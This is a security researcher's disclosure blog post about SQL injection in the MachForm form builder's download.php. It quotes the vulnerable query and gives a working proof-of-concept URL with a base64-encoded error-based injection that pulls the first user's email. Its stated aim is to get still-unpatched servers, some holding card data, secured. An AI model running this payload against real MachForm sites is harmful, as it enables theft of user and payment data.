---
title: "MachForm: Ceci n'est pas un Zero-Day"
excerpt: "Full disclosure of Not-Zero-Day vulnerabilities in MachForm"
header:
  teaser: "/assets/images/machform-not-0-day/teaser.png"
tags:
  - EN
  - Machform
  - SQL Injection
  - Path Traversal
  - RCE
hidden: true
gallery1:
          - url: /assets/images/Perl-from-EXE/referenced.png
            image_path: /assets/images/Perl-from-EXE/referenced.png
            alt: "Referenced strings"
            title: "Referenced strings"
          - url: /assets/images/Perl-from-EXE/strings_2.png
            image_path: /assets/images/Perl-from-EXE/strings_2.png
            alt: "Strings"
            title: "Strings"
---

Years ago, I discovered some vulnerabilities in [MachForm from Appnitro](https://www.machform.com/). These were reported to the vendor who acknowledged it, issued a fix and even published the [notice for the users to update ASAP.](https://www.machform.com/blog-machform-423-security-release/)

Well ... 3 years later, these vulnerabilities are still in the wild. Some of the affected servers even got credit cards information with the corresponding CVV.

I hope that making a public full disclosure will help to get these servers secured.

## Summary
The form creation platform MachForm from Appnitro is subject to SQL injections that lead to path traversal and arbitrary file upload.
The application is widely deployed and with some google dorks it's possible to find various webpages storing sensitive data as Credit Card numbers with corresponding Security Codes.
Otherwise the arbitrary file upload can let an attacker get control of the server by uploading a WebShell.

## SQL injection
The software is subject to SQL injections in the **'download.php'** file. This SQLi can be found on the parameter **'q'** which a *base64* encoded value for the following parameters:
```php
$form_id 	= $params['form_id'];
$id      	= $params['id'];
$field_name = $params['el'];
$file_hash  = $params['hash'];
```
So the injectable parameters are 'el' and 'form_id' obtaining error-based, stacked queries and time-based blind SQL injections.
This is due to the following vulnerable statement:
```php
$query 	= "select {$field_name} from `".MF_TABLE_PREFIX."form_{$form_id}` where id=?";
```

## POC

Proof of concept to get the first user mail:
```
  http:// [URL] / [Machform_folder] /download.php?q=ZWw9IChTRUxFQ1QgMSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoMHgyMDIwLChTRUxFQ1QgTUlEKCh1c2VyX2VtYWlsKSwxLDUwKSBGUk9NIGFwX3VzZXJzIE9SREVSIEJZIHVzZXJfaWQgTElNSVQgMCwxKSwweDIwMjAsRkxPT1IoUkFORCgwKSoyKSl4IEZST00gSU5GT1JNQVRJT05fU0NIRU1BLkNIQVJBQ1RFUl9TRVRTIEdST1VQIEJZIHgpYSkgOyZpZD0xJmhhc2g9MSZmb3JtX2lkPTE=
```
which is the *base64* encoding for:
```
el= (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x2020,(SELECT MID((user_email),1,50) FROM ap_users ORDER BY user_id LIMIT 0,1),0x2020,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) ;&id=1&hash=1&form_id=1
```





